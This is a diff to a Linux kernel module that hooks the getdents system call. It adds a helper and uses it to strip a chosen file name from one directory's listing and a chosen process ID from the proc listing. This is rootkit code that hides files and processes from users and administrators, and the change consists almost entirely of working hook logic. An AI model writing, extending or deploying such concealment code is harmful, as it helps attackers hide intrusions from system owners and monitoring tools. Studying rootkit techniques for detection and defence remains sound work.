@@ -53,6 +53,13 @@ static int remove_dirent_entry(int bytes_read, struct linux_dirent* dirp, unsign
     return nread;
 }
 
+static int remove_dirent_entry_if_exists(int nread, struct linux_dirent* dirp, unsigned int count, char* cwd, char* dir_name, char* name_to_remove){
+    if (strcmp(cwd, dir_name) == 0){
+        return remove_dirent_entry(nread, dirp, count, name_to_remove);
+    }
+    return nread;
+}
+
 asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, unsigned int count)
 {
     int res;
@@ -77,13 +84,14 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
         files_path = f->f_path;
         cwd = d_path(&files_path,path_buf,PATH_MAX*sizeof(char));
         printk(KERN_ALERT "Open file with fd %d  %s", fd,cwd);
-        if (strcmp(cwd, HIDDEN_FILE_DIR) == 0){
-            kfree(path_buf);
-            res = remove_dirent_entry(nread, dirp, count, HIDDEN_FILE_NAME);
-            if (res < 0){
-                return nread;
-            }
-            return res;
+
+        res = remove_dirent_entry_if_exists(nread, dirp, count, cwd, HIDDEN_FILE_DIR, HIDDEN_FILE_NAME);
+        if (res >= 0){
+            nread = res;
+        }
+        res = remove_dirent_entry_if_exists(nread, dirp, count, cwd, PROC_PATH, HIDDEN_PID);
+        if (res >= 0){
+            nread = res;
         }
         kfree(path_buf);
     }
